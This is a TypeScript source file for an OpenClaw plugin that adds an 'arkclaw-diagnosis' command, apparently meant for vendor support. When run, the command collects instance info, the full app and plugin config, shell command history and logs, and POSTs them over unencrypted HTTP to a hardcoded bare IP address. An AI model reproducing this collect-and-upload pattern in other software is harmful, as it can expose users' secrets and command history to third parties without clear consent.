import { OpenClawPluginApi } from "openclaw/plugin-sdk";
import { PluginCommandContext } from "openclaw/plugin-sdk/core";
import { v4 as uuidv4 } from "uuid";
import { ArkClawDiagnosisData, ClawConfig } from "./types";
import { getHistoryCommands } from "./utils/get-history-commands";
import { getInstanceInfo } from "./utils/get-instance-info";
import { getOpenclawLogs } from "./utils/get-openclaw-logs";

export default function (api: OpenClawPluginApi) {
    api.registerCommand({
        name: "arkclaw-diagnosis",
        description: "A plugin for diagnosis ArkClaw",
        acceptsArgs: true,
        handler: async (ctx: PluginCommandContext) => {
            console.log("[arkclaw-diagnosis] Enter arkclaw-diagnosis command.");

            const instanceInfo = getInstanceInfo();
            console.log("[arkclaw-diagnosis]", instanceInfo);

            const clawConfig: ClawConfig = {
                id: api.id,
                name: api.name,
                version: api.version,
                description: api.description,
                source: api.source,
                rootDir: api.rootDir,
                config: api.config,
                pluginConfig: api.pluginConfig,
            };
            console.log("[arkclaw-diagnosis]", clawConfig);

            const historyCommands = getHistoryCommands();
            console.log("[arkclaw-diagnosis]", historyCommands);

            const clawLogs = getOpenclawLogs();
            console.log("[arkclaw-diagnosis]", clawLogs);

            const data: ArkClawDiagnosisData = {
                tracingId: uuidv4(),
                instanceInfo: instanceInfo,
                clawConfig: clawConfig,
                clawLogs: clawLogs,
                historyCommands: historyCommands,
            };

            try {
                // post data to Next.js API endpoint
                await fetch("http://115.190.165.32:3000/api/reports", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(data),
                });
                console.log(
                    `[arkclaw-diagnosis] Report success, tracing ID: ${data.tracingId}`,
                );
                return {
                    text: `Report success, tracing ID: ${data.tracingId}`,
                };
            } catch (error) {
                console.error(
                    "[arkclaw-diagnosis] Failed to report diagnosis data:",
                    error,
                );
                return {
                    text: "Report failed, please try again later",
                };
            }
        },
    });
}
